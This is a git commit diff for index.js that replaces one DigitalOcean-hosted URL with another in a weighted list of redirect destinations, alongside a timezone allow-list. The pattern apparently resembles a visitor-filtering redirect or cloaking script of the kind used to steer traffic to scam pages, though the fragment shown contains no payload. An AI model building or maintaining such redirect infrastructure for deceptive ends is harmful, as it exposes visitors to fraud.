2b1eb53d8b28ac727a4b19b3eb3a35b59dbb4e49
paalakash <palaksh452@gmail.com>
2026-07-17 08:38:20 +0530

    Update index.js

--- index.js
+++ index.js
@@ -34,7 +34,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://starfish-app-kflk4.ondigitalocean.app/werrx01USAHTML/?bcda", weight: 1.0 }
+    { url: "https://urchin-app-yvhlm.ondigitalocean.app/werrx01USAHTML/?bcda", weight: 1.0 }
     
 ];
 
